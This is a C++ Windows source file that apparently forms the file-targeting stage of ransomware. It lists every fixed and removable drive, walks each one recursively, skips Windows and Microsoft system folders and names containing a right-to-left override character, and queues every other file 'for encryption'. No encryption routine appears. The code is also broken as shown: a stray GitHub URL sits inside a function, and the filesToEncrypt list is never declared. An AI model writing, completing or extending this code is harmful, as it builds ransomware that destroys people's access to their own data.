#include <windows.h>
#include <string>
#include <vector>
#include <stack>
#include <iostream>
#include <filesystem>
#include <thread>
#include <experimental/filesystem>
std::vector<std::string> getListOfDrives( ) {
    std::vector<std::string> arrayOfDrives;
    char* szDrives = new char[ MAX_PATH ]( );
    if ( GetLogicalDriveStringsA( MAX_PATH, szDrives ) );
    for ( int i = 0; i < 100; i += 4 )
        if ( szDrives[ i ] != ( char ) 0 )
            arrayOfDrives.push_back( std::string { szDrives[ i ],szDrives[ i + 1 ],szDrives[ i + 2 ] } );
    delete[ ] szDrives;
    return arrayOfDrives;
}
void clearConsole( ) {
    static COORD topLeft = { 0, 0 };
https://github.com/Unklear?tab=repositories    static HANDLE console = GetStdHandle( STD_OUTPUT_HANDLE );
    SetConsoleCursorPosition( console, topLeft );
}
bool shouldEncryptThisEntry( std::string entry, std::vector<std::string> filters ) {
    if (GetFileAttributesA( entry.c_str( ) ) == 65535 )
        return false;
    if ( !filters.empty( ) )
        for ( const auto& at : filters ) {
            if ( entry.find( at ) != std::string::npos )
                return false;
        }
  
    return true;
}
bool shouldEncryptThisWEntry( std::wstring wEntry, std::vector<std::wstring> wFilters ) {
    if ( GetFileAttributes( wEntry.c_str( ) ) == 65535 )
        return false;

    if ( !wFilters.empty( ) )
        for ( const auto& at : wFilters ) {
            if ( wEntry.find( at ) != std::string::npos )
                return false;
        }
    return true;
}
void enumerateDriveFiles( std::string drive ) {
    for ( const auto& dirEntry : std::experimental::filesystem::recursive_directory_iterator( drive ) ) {
        if ( !shouldEncryptThisEntry( dirEntry.path( ).string( ), { "Windows","windows","Microsoft","microsoft","Win32","BaseImages" } ) 
            || !shouldEncryptThisWEntry( dirEntry.path( ).wstring( ), { L"\u202E" } ) )
            continue;
        filesToEncrypt.push_back(dirEntry.path( ).string( ));
        clearConsole( );
        std::cout << "Files queued for encryption: " << filesToEncrypt.size( ) << std::endl;
    }
}
int main( int argc, char* argv[ ] )
{
    std::vector<std::string> drives = getListOfDrives( );
    for ( std::string currentDrive : drives )
        if ( GetDriveTypeA( currentDrive.c_str( ) ) == DRIVE_FIXED || GetDriveTypeA( currentDrive.c_str( ) ) == DRIVE_REMOVABLE )
            enumerateDriveFiles( currentDrive );
    for ( const auto& at : filesToEncrypt ) {
        std::cout << at << std::endl;
    }
    return 0;
}
